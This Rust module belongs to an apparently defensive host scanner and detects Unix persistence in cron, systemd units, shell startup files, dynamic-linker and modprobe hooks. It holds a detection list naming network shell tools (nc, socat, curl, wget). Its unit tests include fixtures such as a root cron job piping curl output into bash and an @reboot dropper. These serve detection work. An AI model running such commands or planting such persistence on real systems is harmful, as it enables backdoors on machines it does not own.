//! Persistence checks: cron, systemd, shell rc, dynamic linker and kernel module hooks.
//!
//! These are the most common landing spots for Unix backdoors. Checks have two layers:
//! 1) Fact layer (`*_entries`): parse persistence entries into structured lists, reusable for baselines.
//! 2) Judgement layer (`*Check`): apply heuristics to facts and emit findings.

use crate::checks::{combined_finding, Check};
use crate::ctx::ScanContext;
use crate::heuristics::{command_signals, path_signals, SignalHit};
use crate::model::{Confidence, Finding, Severity, SnapshotItem};
use crate::util;
use anyhow::Result;
use std::path::PathBuf;
use walkdir::WalkDir;

const MAX_CONFIG: u64 = 4 * util::MB;

fn merge_hits(mut a: Vec<SignalHit>, b: Vec<SignalHit>) -> Vec<SignalHit> {
    for h in b {
        if !a.iter().any(|x| x.code == h.code) {
            a.push(h);
        }
    }
    a.sort_by_key(|h| std::cmp::Reverse(h.severity));
    a
}

/// Risk signals from every absolute-path token on the command line.
fn path_hits_in(cmd: &str) -> Vec<SignalHit> {
    let mut out = Vec::new();
    for tok in cmd.split_whitespace() {
        let t = tok.trim_matches(|c| matches!(c, '"' | '\'' | ';' | ','));
        if t.starts_with('/') {
            out.extend(path_signals(t));
        }
    }
    out
}

// ---------------------------------------------------------------- cron

#[derive(Debug, Clone)]
pub struct CronEntry {
    pub file: PathBuf,
    pub line: usize,
    pub user: Option<String>,
    pub command: String,
}

/// Parse one crontab line.
/// `system` means the line has a user field (/etc/crontab, /etc/cron.d/*).
fn parse_cron_line(line: &str, system: bool) -> Option<(Option<String>, String)> {
    let t = line.trim();
    if t.is_empty() || t.starts_with('#') {
        return None;
    }
    // Environment assignments: SHELL=/bin/sh, MAILTO="", PATH=...
    if let Some(eq) = t.find('=') {
        let key = &t[..eq];
        if !key.contains(char::is_whitespace)
            && !key.is_empty()
            && key
                .chars()
                .all(|c| c.is_ascii_uppercase() || c == '_' || c.is_ascii_digit())
        {
            return None;
        }
    }
    let parts: Vec<&str> = t.split_whitespace().collect();
    let (user, cmd_idx) = if t.starts_with('@') {
        if system {
            (Some(parts.get(1)?.to_string()), 2usize)
        } else {
            (None, 1usize)
        }
    } else if system {
        (Some(parts.get(5)?.to_string()), 6usize)
    } else {
        (None, 5usize)
    };
    if parts.len() <= cmd_idx {
        return None;
    }
    Some((user, parts[cmd_idx..].join(" ")))
}

pub fn cron_files(ctx: &ScanContext) -> Vec<(PathBuf, bool, Option<String>)> {
    let mut out: Vec<(PathBuf, bool, Option<String>)> = Vec::new();

    let crontab = ctx.abs("/etc/crontab");
    if crontab.is_file() {
        out.push((crontab, true, None));
    }
    for p in util::files_in(&ctx.abs("/etc/cron.d")) {
        if let Some(name) = p.file_name().and_then(|n| n.to_str()) {
            if name.starts_with('.') {
                continue;
            }
        }
        out.push((p, true, None));
    }

    // Debian/Ubuntu: /var/spool/cron/crontabs/<user>；RHEL: /var/spool/cron/<user>
    for dir in [
        "/var/spool/cron/crontabs",
        "/var/spool/cron",
        "/usr/lib/cron/tabs",
    ] {
        for p in util::files_in(&ctx.abs(dir)) {
            // Do not treat the crontabs directory itself as a user crontab
            if p.is_dir() {
                continue;
            }
            let user = p.file_name().map(|n| n.to_string_lossy().into_owned());
            out.push((p, false, user));
        }
    }
    out
}

pub fn cron_entries(ctx: &ScanContext) -> Vec<CronEntry> {
    let mut out = Vec::new();
    for (file, system, user) in cron_files(ctx) {
        for (line, text) in util::read_lines(&file, MAX_CONFIG) {
            if let Some((parsed_user, command)) = parse_cron_line(&text, system) {
                out.push(CronEntry {
                    file: file.clone(),
                    line,
                    user: parsed_user.or_else(|| user.clone()),
                    command,
                });
            }
        }
    }
    out
}

pub struct CronCheck;

impl Check for CronCheck {
    fn id(&self) -> &'static str {
        "persist.cron"
    }
    fn title(&self) -> &'static str {
        "Cron persistence"
    }
    fn description(&self) -> &'static str {
        "Cron jobs and cron.d/user crontabs: reverse shells, download-and-execute, encoded payloads."
    }

    fn run(&self, ctx: &ScanContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        for e in cron_entries(ctx) {
            let hits = merge_hits(command_signals(&e.command), path_hits_in(&e.command));
            let detail = match &e.user {
                Some(u) => format!("user={u} :: {}", e.command),
                None => e.command.clone(),
            };
            if let Some(f) = combined_finding(
                self.id(),
                "Suspicious cron job",
                &ctx.disp(&e.file),
                Some(e.line),
                &detail,
                &hits,
                "T1053.003",
            ) {
                findings.push(f);
            }
        }

        // A cron file writable by non-root is a strong signal on its own
        for (file, _, _) in cron_files(ctx) {
            if let Some(mode) = util::mode_of(&file) {
                if util::is_world_writable(mode) {
                    findings.push(
                        Finding::new(
                            self.id(),
                            Severity::High,
                            "Cron config is world-writable",
                            "Any user can add scheduled code, which is arbitrary persistence",
                        )
                        .at(ctx.disp(&file), None)
                        .fix("chmod o-w and verify the file owner")
                        .confidence(Confidence::Certain)
                        .mitre("T1053.003"),
                    );
                }
            }
        }
        Ok(findings)
    }
}

// ---------------------------------------------------------------- systemd

const EXEC_KEYS: &[&str] = &[
    "ExecStart",
    "ExecStartPre",
    "ExecStartPost",
    "ExecReload",
    "ExecStop",
    "ExecStopPost",
    "Environment",
];

#[derive(Debug, Clone)]
pub struct UnitEntry {
    pub file: PathBuf,
    pub key: String,
    pub value: String,
}

fn parse_unit_line(line: &str) -> Option<UnitEntryPartial> {
    let t = line.trim();
    if t.is_empty() || t.starts_with('#') {
        return None;
    }
    let (k, v) = t.split_once('=')?;
    let key = k.trim();
    if !EXEC_KEYS.contains(&key) {
        return None;
    }
    let mut value = v.trim();
    // systemd exec prefixes: - @ + ! :
    value = value.trim_start_matches(['-', '@', '+', '!', ':']);
    if value.is_empty() {
        return None;
    }
    Some(UnitEntryPartial {
        key: key.to_string(),
        value: value.to_string(),
    })
}

struct UnitEntryPartial {
    key: String,
    value: String,
}

fn unit_files(ctx: &ScanContext) -> Vec<PathBuf> {
    let mut dirs: Vec<(PathBuf, usize)> = vec![
        (ctx.abs("/etc/systemd/system"), 3),
        (ctx.abs("/usr/lib/systemd/system"), 1),
        (ctx.abs("/lib/systemd/system"), 1),
        (ctx.abs("/etc/systemd/user"), 2),
        (ctx.abs("/usr/lib/systemd/user"), 1),
    ];
    if ctx.user_scope {
        dirs.push((ctx.home_abs().join(".config/systemd/user"), 3));
    }

    let mut out = Vec::new();
    for (dir, depth) in dirs {
        if !dir.is_dir() {
            continue;
        }
        for entry in WalkDir::new(&dir)
            .max_depth(depth)
            .follow_links(false)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            if !entry.file_type().is_file() {
                continue;
            }
            let ext = entry
                .path()
                .extension()
                .and_then(|e| e.to_str())
                .unwrap_or("");
            if matches!(ext, "service" | "timer" | "socket" | "path") {
                out.push(entry.path().to_path_buf());
            }
            if out.len() > 20_000 {
                return out;
            }
        }
    }
    out.sort();
    out.dedup();
    out
}

pub fn systemd_entries(ctx: &ScanContext) -> Vec<UnitEntry> {
    let mut out = Vec::new();
    for file in unit_files(ctx) {
        for (_, line) in util::read_lines(&file, MAX_CONFIG) {
            if let Some(p) = parse_unit_line(&line) {
                out.push(UnitEntry {
                    file: file.clone(),
                    key: p.key,
                    value: p.value,
                });
            }
        }
    }
    out
}

pub struct SystemdCheck;

impl Check for SystemdCheck {
    fn id(&self) -> &'static str {
        "persist.systemd"
    }
    fn title(&self) -> &'static str {
        "systemd service persistence"
    }
    fn description(&self) -> &'static str {
        "systemd unit ownership/permissions and ExecStart paths or commands that indicate persistence."
    }

    fn run(&self, ctx: &ScanContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // System units must be owned by root and not writable by group/other
        for file in unit_files(ctx) {
            let logical = ctx.disp(&file);
            if !logical.starts_with("/etc/systemd") && !logical.starts_with("/usr/lib/systemd") {
                continue;
            }
            if let Some(uid) = util::owner_uid(&file) {
                if uid != 0 {
                    findings.push(
                        Finding::new(
                            self.id(),
                            Severity::High,
                            "systemd unit file is not owned by root",
                            "systemd runs this unit as root; wrong ownership usually means tampering",
                        )
                        .at(&logical, None)
                        .fix("Reinstall the package or verify the unit origin")
                        .confidence(Confidence::Certain)
                        .mitre("T1543.002"),
                    );
                }
            }
            if let Some(mode) = util::mode_of(&file) {
                if mode & 0o022 != 0 {
                    findings.push(
                        Finding::new(
                            self.id(),
                            Severity::High,
                            "systemd unit file is writable by unprivileged users",
                            "Anyone can rewrite the service command",
                        )
                        .at(&logical, None)
                        .fix("chmod 644 and chown root:root")
                        .confidence(Confidence::Certain)
                        .mitre("T1543.002"),
                    );
                }
            }
        }

        for e in systemd_entries(ctx) {
            let logical = ctx.disp(&e.file);
            // User units starting from home are normal; only system units are suspicious
            let user_unit = logical.contains("/.config/systemd/user/")
                || logical.starts_with("/etc/systemd/user");
            let mut hits = command_signals(&e.value);
            if !user_unit {
                hits = merge_hits(hits, path_hits_in(&e.value));
            }
            if let Some(f) = combined_finding(
                self.id(),
                &format!("suspicious systemd {}", e.key),
                &logical,
                None,
                &format!("{}={}", e.key, e.value),
                &hits,
                "T1543.002",
            ) {
                findings.push(f);
            }
        }
        Ok(findings)
    }
}

// ---------------------------------------------------------------- shell rc

fn rc_files(ctx: &ScanContext) -> Vec<PathBuf> {
    let mut v: Vec<PathBuf> = [
        "/etc/profile",
        "/etc/bash.bashrc",
        "/etc/bashrc",
        "/etc/zshrc",
        "/etc/zsh/zshenv",
        "/etc/zsh/zshrc",
        "/etc/zprofile",
        "/etc/zlogin",
        "/etc/environment",
        "/etc/rc.local",
    ]
    .iter()
    .map(|p| ctx.abs(p))
    .collect();

    for p in util::files_in(&ctx.abs("/etc/profile.d")) {
        v.push(p);
    }

    if ctx.user_scope {
        let home = ctx.home_abs();
        for f in [
            ".bashrc",
            ".bash_profile",
            ".bash_login",
            ".profile",
            ".zshrc",
            ".zprofile",
            ".zshenv",
            ".config/fish/config.fish",
        ] {
            v.push(home.join(f));
        }
    }
    v.retain(|p| p.is_file());
    v
}

/// Directories in a PATH assignment that are world-writable without the sticky bit.
fn writable_path_dirs(ctx: &ScanContext, value: &str) -> Vec<String> {
    let mut bad = Vec::new();
    for dir in value.split(':') {
        let d = dir.trim().trim_matches(|c| matches!(c, '"' | '\''));
        if !d.starts_with('/') {
            continue;
        }
        let abs = ctx.abs(d);
        if let Some(mode) = util::mode_of(&abs) {
            if util::is_world_writable(mode) && !util::is_sticky(mode) {
                bad.push(d.to_string());
            }
        }
    }
    bad
}

pub struct ShellRcCheck;

impl Check for ShellRcCheck {
    fn id(&self) -> &'static str {
        "persist.shell_rc"
    }
    fn title(&self) -> &'static str {
        "Shell startup script backdoors"
    }
    fn description(&self) -> &'static str {
        "Shell startup files (.bashrc, .zshrc, profile.d) for backdoor commands and PATH injection."
    }

    fn run(&self, ctx: &ScanContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        for file in rc_files(ctx) {
            let logical = ctx.disp(&file);
            if let Some(mode) = util::mode_of(&file) {
                if util::is_world_writable(mode) {
                    findings.push(
                        Finding::new(
                            self.id(),
                            Severity::High,
                            "Shell startup script is world-writable",
                            "It runs on every login, so writing to it is persistence",
                        )
                        .at(&logical, None)
                        .fix("chmod o-w and review the contents")
                        .confidence(Confidence::Certain)
                        .mitre("T1546.004"),
                    );
                }
            }

            for (line, text) in util::read_lines(&file, MAX_CONFIG) {
                let t = text.trim();
                if t.is_empty() || t.starts_with('#') {
                    continue;
                }

                // PATH assignment: check for hijackable directories
                let path_part = t.strip_prefix("export ").unwrap_or(t).strip_prefix("PATH=");
                if let Some(value) = path_part {
                    let bad = writable_path_dirs(ctx, value);
                    if !bad.is_empty() {
                        findings.push(
                            Finding::new(
                                self.id(),
                                Severity::High,
                                "World-writable directory injected into PATH (command hijack)",
                                format!(
                                    "PATH contains world-writable directories: {}",
                                    bad.join(", ")
                                ),
                            )
                            .at(&logical, Some(line))
                            .evidence(t)
                            .fix("Remove the directory or replace it with a root-owned one")
                            .confidence(Confidence::Likely)
                            .mitre("T1574.007"),
                        );
                    }
                }

                let hits = command_signals(t);
                if let Some(f) = combined_finding(
                    self.id(),
                    "Suspicious command in a shell startup script",
                    &logical,
                    Some(line),
                    t,
                    &hits,
                    "T1546.004",
                ) {
                    findings.push(f);
                }
            }
        }
        Ok(findings)
    }
}

// ---------------------------------------------------------------- loader

pub struct LoaderCheck;

impl Check for LoaderCheck {
    fn id(&self) -> &'static str {
        "persist.loader"
    }
    fn title(&self) -> &'static str {
        "Dynamic linker / kernel module hijacking"
    }
    fn description(&self) -> &'static str {
        "Dynamic linker and kernel module hooks: ld.so.preload, LD_PRELOAD, ld.so.conf.d, modprobe install, launchd.conf."
    }

    fn run(&self, ctx: &ScanContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // ld.so.preload: the classic rootkit hook. Any content is high risk.
        if let Some(text) = ctx.read("/etc/ld.so.preload", MAX_CONFIG) {
            let entries: Vec<&str> = text
                .lines()
                .map(|l| l.trim())
                .filter(|l| !l.is_empty() && !l.starts_with('#'))
                .collect();
            if !entries.is_empty() {
                findings.push(
                    Finding::new(
                        self.id(),
                        Severity::Critical,
                        "/etc/ld.so.preload is not empty (library injection)",
                        "It forces every dynamically linked program to load the listed library; a healthy system has no content here",
                    )
                    .at("/etc/ld.so.preload", None)
                    .evidence(entries.join(" "))
                    .fix("Verify the library; if unauthorized, empty the file and hunt for a rootkit")
                    .confidence(Confidence::Certain)
                    .mitre("T1574.006"),
                );
            }
        }

        // Environment variable injection
        for file in [
            "/etc/environment",
            "/etc/profile",
            "/etc/bash.bashrc",
            "/etc/zsh/zshenv",
        ] {
            for (line, text) in util::read_lines(&ctx.abs(file), MAX_CONFIG) {
                let t = text.trim();
                if t.is_empty() || t.starts_with('#') {
                    continue;
                }
                let hits: Vec<SignalHit> = command_signals(t)
                    .into_iter()
                    .filter(|h| h.code == "loader-inject")
                    .collect();
                if let Some(f) = combined_finding(
                    self.id(),
                    "Environment variable injection",
                    file,
                    Some(line),
                    t,
                    &hits,
                    "T1574.006",
                ) {
                    findings.push(f);
                }
            }
        }

        // Extra library search paths
        for file in util::files_in(&ctx.abs("/etc/ld.so.conf.d")) {
            for (line, text) in util::read_lines(&file, MAX_CONFIG) {
                let t = text.trim();
                if t.is_empty() || t.starts_with('#') {
                    continue;
                }
                if t.starts_with('/')
                    && (t.starts_with("/tmp")
                        || t.starts_with("/dev/shm")
                        || t.starts_with("/home")
                        || t.starts_with("/Users"))
                {
                    findings.push(
                        Finding::new(
                            self.id(),
                            Severity::High,
                            "Library search path points to a writable directory",
                            "An attacker can drop a same-named library and hijack process loading",
                        )
                        .at(ctx.disp(&file), Some(line))
                        .evidence(t)
                        .fix("Remove the search path")
                        .confidence(Confidence::Certain)
                        .mitre("T1574.006"),
                    );
                }
            }
        }

        // modprobe install/remove hooks: run arbitrary commands on module load
        for dir in ["/etc/modprobe.d", "/usr/lib/modprobe.d", "/run/modprobe.d"] {
            for file in util::files_in(&ctx.abs(dir)) {
                for (line, text) in util::read_lines(&file, MAX_CONFIG) {
                    let t = text.trim();
                    if t.is_empty() || t.starts_with('#') {
                        continue;
                    }
                    if let Some(rest) = t
                        .strip_prefix("install ")
                        .or_else(|| t.strip_prefix("remove "))
                    {
                        let cmd = rest.split_whitespace().nth(1).unwrap_or("");
                        if cmd.is_empty() || cmd.contains("modprobe") {
                            continue;
                        }
                        let base = std::path::Path::new(cmd)
                            .file_name()
                            .map(|n| n.to_string_lossy().into_owned())
                            .unwrap_or_default();
                        let interpreter = [
                            "sh", "bash", "dash", "zsh", "ksh", "perl", "python", "python3",
                            "ruby", "nc", "ncat", "netcat", "curl", "wget", "socat", "busybox",
                        ]
                        .contains(&base.as_str());
                        let writable_path = cmd.starts_with("/tmp")
                            || cmd.starts_with("/dev/shm")
                            || cmd.starts_with("/var/tmp")
                            || cmd.starts_with("/home")
                            || cmd.starts_with("/Users");
                        // Distributions use ordinary tools for module preload (e.g. ndctl),
                        // so only interpreters, writable paths, or behavioral matches are treated as backdoors.
                        if !interpreter && !writable_path && command_signals(t).is_empty() {
                            continue;
                        }
                        {
                            findings.push(
                                Finding::new(
                                    self.id(),
                                    Severity::Critical,
                                    "Kernel module hook executes an external command",
                                    "A modprobe rule can run any program when a module is loaded or unloaded",
                                )
                                .at(ctx.disp(&file), Some(line))
                                .evidence(t)
                                .fix("Remove the rule and review module load history")
                                .confidence(Confidence::Certain)
                                .mitre("T1547.006"),
                            );
                        }
                    }
                }
            }
        }

        // macOS: legacy launchd.conf injects environment variables into every process
        if ctx.os == crate::model::Os::MacOs {
            if let Some(text) = ctx.read("/etc/launchd.conf", MAX_CONFIG) {
                let body: Vec<&str> = text
                    .lines()
                    .map(|l| l.trim())
                    .filter(|l| !l.is_empty() && !l.starts_with('#'))
                    .collect();
                if !body.is_empty() {
                    findings.push(
                        Finding::new(
                            self.id(),
                            Severity::High,
                            "/etc/launchd.conf contains custom configuration",
                            "It changes the environment of every launchd child process",
                        )
                        .at("/etc/launchd.conf", None)
                        .evidence(body.join("; "))
                        .fix("Review and remove it; configure LaunchDaemons explicitly instead")
                        .confidence(Confidence::Likely)
                        .mitre("T1574.006"),
                    );
                }
            }
        }

        Ok(findings)
    }
}

// ---------------------------------------------------------------- snapshot

/// Persistence inventory for baseline diffing: only structured entries whose addition is suspicious.
pub fn snapshot(ctx: &ScanContext) -> Vec<SnapshotItem> {
    let mut items = Vec::new();

    for e in cron_entries(ctx) {
        let detail = format!(
            "user={} :: {}",
            e.user.clone().unwrap_or_else(|| "-".into()),
            util::normalize(&e.command)
        );
        items.push(SnapshotItem {
            key: format!("cron|{}|{}", ctx.disp(&e.file), detail),
            kind: "cron".into(),
            path: ctx.disp(&e.file),
            detail,
        });
    }

    for u in systemd_entries(ctx) {
        let detail = format!("{}={}", u.key, util::normalize(&u.value));
        items.push(SnapshotItem {
            key: format!("systemd|{}|{}", ctx.disp(&u.file), detail),
            kind: "systemd".into(),
            path: ctx.disp(&u.file),
            detail,
        });
    }

    for k in crate::checks::ssh::authorized_key_entries(ctx) {
        items.push(SnapshotItem {
            key: format!("ssh|{}|{}", ctx.disp(&k.file), k.fingerprint),
            kind: "ssh_key".into(),
            path: ctx.disp(&k.file),
            detail: format!("{} {}", k.kind, k.comment),
        });
    }

    for e in crate::checks::mac::launchd_entries(ctx) {
        let detail = format!("label={} program={}", e.label, e.program);
        items.push(SnapshotItem {
            key: format!("launchd|{}|{}", ctx.disp(&e.file), util::normalize(&detail)),
            kind: "launchd".into(),
            path: ctx.disp(&e.file),
            detail,
        });
    }

    items
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cron_system_line() {
        let (u, c) = parse_cron_line("*/5 * * * * root curl -fsSL http://x | bash", true).unwrap();
        assert_eq!(u.as_deref(), Some("root"));
        assert!(c.starts_with("curl"));
    }

    #[test]
    fn cron_user_line() {
        let (u, c) = parse_cron_line("0 3 * * * /usr/local/bin/backup --full", false).unwrap();
        assert!(u.is_none());
        assert_eq!(c, "/usr/local/bin/backup --full");
    }

    #[test]
    fn cron_reboot_line() {
        let (u, c) = parse_cron_line("@reboot root /tmp/dropper", true).unwrap();
        assert_eq!(u.as_deref(), Some("root"));
        assert_eq!(c, "/tmp/dropper");
    }

    #[test]
    fn cron_skips_env_and_comments() {
        assert!(parse_cron_line("SHELL=/bin/sh", true).is_none());
        assert!(parse_cron_line("PATH=/usr/bin:/bin", true).is_none());
        assert!(parse_cron_line("# 0 * * * * root x", true).is_none());
        assert!(parse_cron_line("", true).is_none());
    }

    #[test]
    fn unit_exec_prefix_stripped() {
        let p = parse_unit_line("ExecStart=-/tmp/beacon --daemon").unwrap();
        assert_eq!(p.key, "ExecStart");
        assert_eq!(p.value, "/tmp/beacon --daemon");
    }
}
